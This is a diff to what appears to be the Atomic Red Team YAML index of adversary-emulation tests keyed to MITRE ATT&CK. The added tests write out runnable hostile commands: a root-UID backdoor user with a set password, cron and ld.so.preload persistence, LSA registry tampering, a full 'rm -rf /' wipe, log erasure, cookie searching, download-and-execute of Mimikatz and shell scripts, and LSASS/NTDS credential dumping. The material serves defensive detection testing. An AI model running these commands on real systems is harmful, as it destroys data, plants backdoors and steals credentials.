@@ -1156,6 +1156,27 @@ persistence:
         command: |
           New-LocalUser -Name #{username} -NoPassword
           net user /add #{username}
+    - name: Create a new user in Linux with `root` UID and GID.
+      description: 'Creates a new user in Linux and adds the user to the `root` group.
+        This technique was used by adversaries during the Butter attack campaign.
+
+'
+      supported_platforms:
+      - linux
+      input_arguments:
+        username:
+          description: Username of the user to create
+          type: String
+          default: butter
+        password:
+          description: Password of the user to create
+          type: String
+          default: BetterWithButter
+      executor:
+        name: bash
+        command: |-
+          useradd -o -u 0 -g 0 -M -d /root -s /bin/bash #{username}
+          echo "#{password}" | passwd --stdin #{username}
   T1158:
     technique:
       id: attack-pattern--dc27c2ec-c5f9-4228-ba57-d67b590bda93
@@ -2125,8 +2146,10 @@ persistence:
       created: '2017-12-14T16:46:06.044Z'
       identifier: T1168
     atomic_tests:
-    - name: Cron Job
-      description: 'Set a cron job
+    - name: Cron - Replace crontab with referenced file
+      description: 'This test replaces the current user''s crontab file with the contents
+        of the referenced file. This technique was used by numerous IoT automated
+        exploitation attacks.
 
 '
       supported_platforms:
@@ -2135,19 +2158,47 @@ persistence:
       - ubuntu
       - linux
       input_arguments:
-        script:
-          description: Script to execute
-          type: path
+        command:
+          description: Command to execute
+          type: string
           default: "/tmp/evil.sh"
+        tmp_cron:
+          description: Temporary reference file to hold evil cron schedule
+          type: path
+          default: "/tmp/persistevil"
       executor:
-        name: sh
-        command: 'echo "* * * * * #{script}" > /tmp/persistevil && crontab /tmp/persistevil
+        name: bash
+        command: 'echo "* * * * * #{command}" > #{tmp_cron} && crontab #{tmp_cron}
 
 '
-    - name: Cron Job
-      description: 'Manually set a cron job
+    - name: Cron - Add script to cron folder
+      description: 'This test adds a script to a cron folder configured to execute
+        on a schedule. This technique was used by the threat actor Rocke during the
+        exploitation of Linux web servers.
 
 '
+      supported_platforms:
+      - macos
+      - centos
+      - ubuntu
+      - linux
+      input_arguments:
+        command:
+          description: Command to execute
+          type: string
+          default: echo 'Hello from Atomic Red Team' > /tmp/atomic.log
+        cron_script_name:
+          description: Name of file to store in cron folder
+          type: string
+          default: persistevil
+      executor:
+        name: bash
+        command: 'echo "#{command}" > /etc/cron.daily/#{cron_script_name}
+
+'
+    - name: Event Monitor Daemon Persistence
+      description: "This test adds persistence via a plist to execute via the macOS
+        Event Monitor Daemon. \n"
       supported_platforms:
       - macos
       - centos
@@ -3241,6 +3292,73 @@ persistence:
           reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f
           reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d "%SystemRoot%\System32\evilscreensaver.scr" /f
           shutdown /r /t 0
+  T1101:
+    technique:
+      id: attack-pattern--6c174520-beea-43d9-aac6-28fb77f3e446
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      name: Security Support Provider
+      description: |-
+        Windows Security Support Provider (SSP) DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</code> and <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.
+         (Citation: Graeber 2014)
+      external_references:
+      - external_id: T1101
+        url: https://attack.mitre.org/techniques/T1101
+        source_name: mitre-attack
+      - url: http://docplayer.net/20839173-Analysis-of-malicious-security-support-provider-dlls.html
+        description: Graeber, M. (2014, October). Analysis of Malicious Security Support
+          Provider DLLs. Retrieved March 1, 2017.
+        source_name: Graeber 2014
+      - url: https://technet.microsoft.com/en-us/library/dn408187.aspx
+        description: Microsoft. (2013, July 31). Configuring Additional LSA Protection.
+          Retrieved June 24, 2015.
+        source_name: Microsoft Configure LSA
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      x_mitre_version: '1.0'
+      x_mitre_data_sources:
+      - DLL monitoring
+      - Windows Registry
+      - Loaded DLLs
+      x_mitre_detection: 'Monitor the Registry for changes to the SSP Registry keys.
+        Monitor the LSA process for DLL loads. Windows 8.1 and Windows Server 2012
+        R2 may generate events when unsigned SSP DLLs try to load into the LSA by
+        setting the Registry key <code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
+        File Execution Options\LSASS.exe</code> with AuditLevel = 8. (Citation: Graeber
+        2014) (Citation: Microsoft Configure LSA)'
+      x_mitre_permissions_required:
+      - Administrator
+      x_mitre_platforms:
+      - Windows
+      type: attack-pattern
+      kill_chain_phases:
+      - phase_name: persistence
+        kill_chain_name: mitre-attack
+      modified: '2018-10-17T00:14:20.652Z'
+      created: '2017-05-31T21:31:13.447Z'
+      identifier: T1101
+    atomic_tests:
+    - name: Modify SSP configuration in registry
+      description: Add a value to a Windows registry SSP key, simulating an adversarial
+        modification of those keys.
+      supported_platforms:
+      - windows
+      input_arguments:
+        fake_ssp_dll:
+          description: Value added to registry key. Normally refers to a DLL name
+            in C:\Windows\System32.
+          type: String
+          default: not-a-ssp
+      executor:
+        name: powershell
+        command: |
+          # run these in sequence
+          $SecurityPackages = Get-ItemProperty HKLM:\System\CurrentControlSet\Control\Lsa -Name 'Security Packages' | Select-Object -ExpandProperty 'Security Packages'
+          $SecurityPackagesUpdated = $SecurityPackages
+          $SecurityPackagesUpdated += "#{fake_ssp_dll}"
+          Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name 'Security Packages' -Value $SecurityPackagesUpdated
+
+          # revert (before reboot)
+          Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name 'Security Packages' -Value $SecurityPackages
   T1166:
     technique:
       id: attack-pattern--c0df6533-30ee-4a4a-9c6d-17af5abdf0b2
@@ -4914,7 +5032,7 @@ defense-evasion:
         name: command_prompt
         command: |
           cmd.exe /c copy %windir%\\system32\\certutil.exe %temp%tcm.tmp
-          cmd.exe /c %temp%tcm.tmp -decode #{executable}
+          cmd.exe /c %temp%tcm.tmp -decode #{executable} file.txt
   T1089:
     technique:
       id: attack-pattern--2e0dd10b-676d-4964-acd0-8a404c92b044
@@ -5287,7 +5405,7 @@ defense-evasion:
 
 '
     - name: bcdedit
-      description: 'xxx
+      description: 'This test leverages `bcdedit` to remove boot-time recovery measures.
 
 '
       supported_platforms:
@@ -5298,14 +5416,27 @@ defense-evasion:
           bcdedit /set {default} bootstatuspolicy ignoreallfailures
           bcdedit /set {default} recoveryenabled no
     - name: wbadmin
-      description: 'xxx
-
-'
+      description: "This test deletes Windows Backup catalogs. \n"
       supported_platforms:
       - windows
       executor:
         name: command_prompt
         command: 'wbadmin delete catalog -quiet
+
+'
+    - name: Delete Filesystem - Linux
+      description: 'This test deletes the entire root filesystem of a Linux system.
+        This technique was used by Amnesia IoT malware to avoid analysis. This test
+        is dangerous and destructive, do NOT use on production equipment.
+
+'
+      supported_platforms:
+      - linux
+      - centos
+      - ubuntu
+      executor:
+        name: bash
+        command: 'rm -rf / --no-preserve-root > /dev/null 2> /dev/null
 
 '
   T1222:
@@ -5716,6 +5847,23 @@ defense-evasion:
       executor:
         name: bash
         command: 'chown #{owner} #{file_or_folder} -R
+
+'
+    - name: chattr - Remove immutable file attribute
+      description: |
+        Remove's a file's `immutable` attribute using `chattr`.
+        This technique was used by the threat actor Rocke during the compromise of Linux web servers.
+      supported_platforms:
+      - macos
+      - linux
+      input_arguments:
+        file_to_modify:
+          description: Path of the file
+          type: path
+          default: "/var/spool/cron/root"
+      executor:
+        name: sh
+        command: 'chattr -i #{file_to_modify}
 
 '
   T1144:
@@ -6451,6 +6599,39 @@ defense-evasion:
         command: |
           rm -rf /private/var/log/system.log*
           rm -rf /private/var/audit/*
+    - name: Overwrite Linux Mail Spool
+      description: 'This test overwrites the Linux mail spool of a specified user.
+        This technique was used by threat actor Rocke during the exploitation of Linux
+        web servers.
+
+'
+      supported_platforms:
+      - linux
+      input_arguments:
+        username:
+          description: Username of mail spool
+          type: String
+          default: root
+      executor:
+        name: bash
+        command: 'echo 0> /var/spool/mail/#{username}
+
+'
+    - name: Overwrite Linux Log
+      description: 'This test overwrites the specified log. This technique was used
+        by threat actor Rocke during the exploitation of Linux web servers.
+
+'
+      supported_platforms:
+      - linux
+      input_arguments:
+        log_path:
+          description: Path of specified log
+          type: Path
+          default: "/var/log/secure"
+      executor:
+        name: bash
+        command: 'echo 0> #{log_path}'
   T1202:
     technique:
       id: attack-pattern--3b0e52ce-517a-4614-a523-1bd5deef6c5e
@@ -7741,6 +7922,24 @@ defense-evasion:
       executor:
         name: powershell
         command: 'Invoke-DllInjection.ps1 -ProcessID #{process_id} -Dll #{dll_payload}
+
+'
+    - name: Shared Library Injection via /etc/ld.so.preload
+      description: 'This test adds a shared library to the `ld.so.preload` list to
+        execute and intercept API calls. This technique was used by threat actor Rocke
+        during the exploitation of Linux web servers. This requires the `glibc` package.
+
+'
+      supported_platforms:
+      - linux
+      input_arguments:
+        path_to_shared_library:
+          description: Path to a shared library object
+          type: Path
+          default: "/tmp/evil_module.so"
+      executor:
+        name: bash
+        command: 'echo #{path_to_shared_library} > /etc/ld.so.preload
 
 '
   T1121:
@@ -10407,6 +10606,24 @@ privilege-escalation:
       executor:
         name: powershell
         command: 'Invoke-DllInjection.ps1 -ProcessID #{process_id} -Dll #{dll_payload}
+
+'
+    - name: Shared Library Injection via /etc/ld.so.preload
+      description: 'This test adds a shared library to the `ld.so.preload` list to
+        execute and intercept API calls. This technique was used by threat actor Rocke
+        during the exploitation of Linux web servers. This requires the `glibc` package.
+
+'
+      supported_platforms:
+      - linux
+      input_arguments:
+        path_to_shared_library:
+          description: Path to a shared library object
+          type: Path
+          default: "/tmp/evil_module.so"
+      executor:
+        name: bash
+        command: 'echo #{path_to_shared_library} > /etc/ld.so.preload
 
 '
   T1053:
@@ -13228,7 +13445,7 @@ credential-access:
         remote_script:
           description: URL to a remote Mimikatz script that dumps credentials
           type: Url
-          default: https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1
+          default: https://raw.githubusercontent.com/EmpireProject/Empire/dev/data/module_source/credentials/Invoke-Mimikatz.ps1
       executor:
         name: powershell
         command: 'IEX (New-Object Net.WebClient).DownloadString(''#{remote_script}'');
@@ -13275,9 +13492,9 @@ credential-access:
           reg save HKLM\system system
           reg save HKLM\security security
     - name: Dump LSASS.exe Memory using ProcDump
-      description: "The memory of lsass.exe is often dumped for offline credential
-        theft attacks. This can be achieved with Sysinternals \nProcDump. The tool
-        may be downloaded from https://docs.microsoft.com/en-us/sysinternals/downloads/procdump.\n"
+      description: |
+        The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals
+        ProcDump. The tool may be downloaded from https://docs.microsoft.com/en-us/sysinternals/downloads/procdump.
       supported_platforms:
       - windows
       input_arguments:
@@ -13291,25 +13508,28 @@ credential-access:
 
 '
     - name: Dump LSASS.exe Memory using Windows Task Manager
-      description: "The memory of lsass.exe is often dumped for offline credential
-        theft attacks. This can be achieved with the Windows Task \nManager and administrative
-        permissions.\n"
+      description: |
+        The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with the Windows Task
+        Manager and administrative permissions.
       supported_platforms:
       - windows
       executor:
         name: manual
-        steps: "1. Open Task Manager:\n  On a Windows system this can be accomplished
-          by pressing CTRL-ALT-DEL and selecting Task Manager or by right-clicking
-          \n  on the task bar and selecting \"Task Manager\".\n\n2. Select lsass.exe:\n
-          \ If lsass.exe is not visible, select \"Show processes from all users\".
-          This will allow you to observe execution of lsass.exe \n  and select it
-          for manipulation.\n\n3. Dump lsass.exe memory:\n  Right-click on lsass.exe
-          in Task Manager. Select \"Create Dump File\". The following dialog will
-          show you the path to the saved file.\n"
+        steps: |
+          1. Open Task Manager:
+            On a Windows system this can be accomplished by pressing CTRL-ALT-DEL and selecting Task Manager or by right-clicking
+            on the task bar and selecting "Task Manager".
+
+          2. Select lsass.exe:
+            If lsass.exe is not visible, select "Show processes from all users". This will allow you to observe execution of lsass.exe
+            and select it for manipulation.
+
+          3. Dump lsass.exe memory:
+            Right-click on lsass.exe in Task Manager. Select "Create Dump File". The following dialog will show you the path to the saved file.
     - name: Offline Credential Theft With Mimikatz
-      description: "The memory of lsass.exe is often dumped for offline credential
-        theft attacks. Adversaries commonly perform this offline analysis with \nMimikatz.
-        This tool is available at https://github.com/gentilkiwi/mimikatz.\n"
+      description: |
+        The memory of lsass.exe is often dumped for offline credential theft attacks. Adversaries commonly perform this offline analysis with
+        Mimikatz. This tool is available at https://github.com/gentilkiwi/mimikatz.
       supported_platforms:
       - windows
       input_arguments:
@@ -13329,11 +13549,10 @@ credential-access:
           3. Obtain Credentials:
             Within the Mimikatz interactive shell, execute `sekurlsa::logonpasswords full`
     - name: Dump Active Directory Database with NTDSUtil
-      description: "The Active Directory database NTDS.dit may be dumped using NTDSUtil
-        for offline credential theft attacks. This capability \nuses the \"IFM\" or
-        \"Install From Media\" backup functionality that allows Active Directory restoration
-        or installation of \nsubsequent domain controllers without the need of network-based
-        replication.\n"
+      description: |
+        The Active Directory database NTDS.dit may be dumped using NTDSUtil for offline credential theft attacks. This capability
+        uses the "IFM" or "Install From Media" backup functionality that allows Active Directory restoration or installation of
+        subsequent domain controllers without the need of network-based replication.
       supported_platforms:
       - windows
       input_arguments:
@@ -13343,7 +13562,9 @@ credential-access:
           default: C:\Atomic_Red_Team
       executor:
         name: command_prompt
-        command: 'ntdsutil “ac i ntds” “ifm” “create full #{output_folder} q q'
+        command: 'ntdsutil “ac i ntds” “ifm” “create full #{output_folder} q q
+
+'
   T1081:
     technique:
       id: attack-pattern--ba8e391f-14b5-496f-81f2-2d5ecd646c1c
@@ -14914,8 +15135,10 @@ execution:
       created: '2017-12-14T16:46:06.044Z'
       identifier: T1168
     atomic_tests:
-    - name: Cron Job
-      description: 'Set a cron job
+    - name: Cron - Replace crontab with referenced file
+      description: 'This test replaces the current user''s crontab file with the contents
+        of the referenced file. This technique was used by numerous IoT automated
+        exploitation attacks.
 
 '
       supported_platforms:
@@ -14924,19 +15147,47 @@ execution:
       - ubuntu
       - linux
       input_arguments:
-        script:
-          description: Script to execute
-          type: path
+        command:
+          description: Command to execute
+          type: string
           default: "/tmp/evil.sh"
+        tmp_cron:
+          description: Temporary reference file to hold evil cron schedule
+          type: path
+          default: "/tmp/persistevil"
       executor:
-        name: sh
-        command: 'echo "* * * * * #{script}" > /tmp/persistevil && crontab /tmp/persistevil
+        name: bash
+        command: 'echo "* * * * * #{command}" > #{tmp_cron} && crontab #{tmp_cron}
 
 '
-    - name: Cron Job
-      description: 'Manually set a cron job
+    - name: Cron - Add script to cron folder
+      description: 'This test adds a script to a cron folder configured to execute
+        on a schedule. This technique was used by the threat actor Rocke during the
+        exploitation of Linux web servers.
 
 '
+      supported_platforms:
+      - macos
+      - centos
+      - ubuntu
+      - linux
+      input_arguments:
+        command:
+          description: Command to execute
+          type: string
+          default: echo 'Hello from Atomic Red Team' > /tmp/atomic.log
+        cron_script_name:
+          description: Name of file to store in cron folder
+          type: string
+          default: persistevil
+      executor:
+        name: bash
+        command: 'echo "#{command}" > /etc/cron.daily/#{cron_script_name}
+
+'
+    - name: Event Monitor Daemon Persistence
+      description: "This test adds persistence via a plist to execute via the macOS
+        Event Monitor Daemon. \n"
       supported_platforms:
       - macos
       - centos
@@ -17513,6 +17764,51 @@ lateral-movement:
         command: 'sftp #{username}@#{remote_host}:#{remote_file} #{local_path}
 
 '
+    - name: certutil download (urlcache)
+      description: 'Use certutil -urlcache argument to download a file from the web.
+        Note - /urlcache also works!
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        remote_file:
+          description: URL of file to copy
+          type: Url
+          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
+        local_path:
+          description: Local path to place file
+          type: Path
+          default: Atomic-license.txt
+      executor:
+        name: command_prompt
+        command: 'cmd /c certutil -urlcache -split -f #{remote_file} #{local_path}
+
+'
+    - name: certutil download (verifyctl)
+      description: 'Use certutil -verifyctl argument to download a file from the web.
+        Note - /verifyctl also works!
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        remote_file:
+          description: URL of file to copy
+          type: Url
+          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
+        local_path:
+          description: Local path to place file
+          type: Path
+          default: Atomic-license.txt
+      executor:
+        name: powershell
+        command: |
+          $datePath = "certutil-$(Get-Date -format yyyy_MM_dd_HH_mm)"
+          New-Item -Path $datePath -ItemType Directory
+          Set-Location $datePath
+          certutil -verifyctl -split -f #{remote_file}
+          Get-ChildItem | Where-Object {$_.Name -notlike "*.txt"} | Foreach-Object { Move-Item $_.Name -Destination #{local_path} }
   T1077:
     technique:
       id: attack-pattern--ffe742ed-9100-4686-9e00-c331da544787
@@ -18058,19 +18354,18 @@ collection:
       created: '2017-05-31T21:30:58.938Z'
       identifier: T1074
     atomic_tests:
-    - name: Stage data from Discovery.bat
-      description: 'Utilize powershell to download discovery.bat and save to a local
-        file
+    - name: Stage data from Discovery.sh
+      description: 'Utilize curl to download discovery.sh and execute a basic information
+        gathering shell script
 
 '
       supported_platforms:
-      - windows
+      - linux
+      - macos
       executor:
-        name: powershell
-        command: '"IEX (New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat'')"
-          > c:\windows\pi.log
-
-'
+        name: bash
+        command: curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/Discovery.sh
+          | bash -s > /tmp/discovery.log
   '':
     technique:
       id: attack-pattern--6faf650d-bf31-4eb4-802d-1000cf38efaf
@@ -18114,6 +18409,122 @@ collection:
       modified: '2018-10-17T00:14:20.652Z'
       created: '2017-05-31T21:31:37.917Z'
     atomic_tests: []
+  T1005:
+    technique:
+      id: attack-pattern--3c4a2599-71ee-4405-ba1e-0e28414b4bc5
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      name: Data from Local System
+      description: |-
+        Sensitive data can be collected from local system sources, such as the file system or databases of information residing on the system prior to Exfiltration.
+
+        Adversaries will often search the file system on computers they have compromised to find files of interest. They may do this using a [Command-Line Interface](https://attack.mitre.org/techniques/T1059), such as [cmd](https://attack.mitre.org/software/S0106), which has functionality to interact with the file system to gather information. Some adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on the local system.
+      external_references:
+      - external_id: T1005
+        url: https://attack.mitre.org/techniques/T1005
+        source_name: mitre-attack
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      x_mitre_version: '1.0'
+      x_mitre_data_sources:
+      - File monitoring
+      - Process monitoring
+      - Process command-line parameters
+      x_mitre_detection: Monitor processes and command-line arguments for actions
+        that could be taken to collect files from a system. Remote access tools with
+        built-in features may interact directly with the Windows API to gather data.
+        Data may also be acquired through Windows system management tools such as
+        [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047)
+        and [PowerShell](https://attack.mitre.org/techniques/T1086).
+      x_mitre_system_requirements:
+      - Privileges to access certain files and directories
+      x_mitre_platforms:
+      - Linux
+      - macOS
+      - Windows
+      type: attack-pattern
+      kill_chain_phases:
+      - phase_name: collection
+        kill_chain_name: mitre-attack
+      modified: '2018-10-17T00:14:20.652Z'
+      created: '2017-05-31T21:30:20.537Z'
+      identifier: T1005
+    atomic_tests:
+    - name: Search macOS Safari Cookies
+      description: 'This test uses `grep` to search a macOS Safari binaryCookies file
+        for specified values. This was used by CookieMiner malware.
+
+'
+      supported_platforms:
+      - macos
+      input_arguments:
+        search_string:
+          description: String to search Safari cookies to find.
+          type: string
+          default: coinbase
+      executor:
+        name: sh
+        command: |
+          cd ~/Library/Cookies
+          grep -q "#{search_string}" "Cookies.binarycookies"
+  T1114:
+    technique:
+      id: attack-pattern--1608f3e1-598a-42f4-a01a-2e252e81728f
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      name: Email Collection
+      description: |-
+        Adversaries may target user email to collect sensitive information from a target.
+
+        Files containing email data can be acquired from a user's system, such as Outlook storage or cache files .pst and .ost.
+
+        Adversaries may leverage a user's credentials and interact directly with the Exchange server to acquire information from within a network.
+
+        Some adversaries may acquire user credentials and access externally facing webmail applications, such as Outlook Web Access.
+      external_references:
+      - external_id: T1114
+        url: https://attack.mitre.org/techniques/T1114
+        source_name: mitre-attack
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      x_mitre_version: '1.0'
+      x_mitre_data_sources:
+      - Authentication logs
+      - File monitoring
+      - Process monitoring
+      - Process use of network
+      x_mitre_detection: |-
+        There are likely a variety of ways an adversary could collect email from a target, each with a different mechanism for detection.
+
+        File access of local system email files for Exfiltration, unusual processes connecting to an email server within a network, or unusual access patterns or authentication attempts on a public-facing webmail server may all be indicators of malicious activity.
+
+        Monitor processes and command-line arguments for actions that could be taken to gather local email files. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1086).
+      x_mitre_platforms:
+      - Windows
+      type: attack-pattern
+      kill_chain_phases:
+      - phase_name: collection
+        kill_chain_name: mitre-attack
+      modified: '2018-10-17T00:14:20.652Z'
+      created: '2017-05-31T21:31:25.454Z'
+      identifier: T1114
+    atomic_tests:
+    - name: T1114 Email Collection with PowerShell
+      description: 'Search through local Outlook installation, extract mail, compress
+        the contents, and saves everything to a directory for later exfiltration.
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: command_prompt
+        command: |
+          Display email contents in the terminal
+            PS C:\> .\Get-Inbox.ps1
+
+          Write emails out to a CSV
+            PS C:\> .\Get-Inbox.ps1 -file "mail.csv"
+
+          Download and Execute
+            "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Get-Inbox.ps1')"
   T1056:
     technique:
       id: attack-pattern--bb5a00de-e086-4859-a231-fa793f6797e2
@@ -19195,6 +19606,51 @@ command-and-control:
         command: 'sftp #{username}@#{remote_host}:#{remote_file} #{local_path}
 
 '
+    - name: certutil download (urlcache)
+      description: 'Use certutil -urlcache argument to download a file from the web.
+        Note - /urlcache also works!
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        remote_file:
+          description: URL of file to copy
+          type: Url
+          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
+        local_path:
+          description: Local path to place file
+          type: Path
+          default: Atomic-license.txt
+      executor:
+        name: command_prompt
+        command: 'cmd /c certutil -urlcache -split -f #{remote_file} #{local_path}
+
+'
+    - name: certutil download (verifyctl)
+      description: 'Use certutil -verifyctl argument to download a file from the web.
+        Note - /verifyctl also works!
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        remote_file:
+          description: URL of file to copy
+          type: Url
+          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
+        local_path:
+          description: Local path to place file
+          type: Path
+          default: Atomic-license.txt
+      executor:
+        name: powershell
+        command: |
+          $datePath = "certutil-$(Get-Date -format yyyy_MM_dd_HH_mm)"
+          New-Item -Path $datePath -ItemType Directory
+          Set-Location $datePath
+          certutil -verifyctl -split -f #{remote_file}
+          Get-ChildItem | Where-Object {$_.Name -notlike "*.txt"} | Foreach-Object { Move-Item $_.Name -Destination #{local_path} }
   T1065:
     technique:
       id: attack-pattern--c848fcf7-6b62-4bde-8216-b6c157d48da0
